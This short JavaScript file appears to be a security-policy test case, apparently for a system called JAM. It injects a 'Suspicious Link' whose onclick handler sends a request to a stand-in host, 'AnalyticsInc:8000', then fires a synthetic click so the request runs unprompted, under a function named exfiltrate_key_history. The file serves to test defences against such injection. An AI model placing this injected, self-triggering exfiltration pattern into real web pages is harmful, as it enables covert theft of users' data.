// exfil_test_link2.js
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link2", true);xmlhttp.send(null);';
  var link = document.createElement("a");
  link.href = "#";
  JAM.set(link, "innerHTML", "Suspicious Link");
  link.id = "mylink";
  JAM.call(link.setAttribute, link, ["onclick", exp]);
  var v2 = document.getElementsByTagName("body");
  introspect(JAM.policy.p1) {
    var v0 = v2[0]
  }
  JAM.call(v0.appendChild, v0, [link]);
  var linkref = document.getElementById("mylink");
  var event$$1 = new Event("click");
  linkref.dispatchEvent(event$$1);
  return;
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)

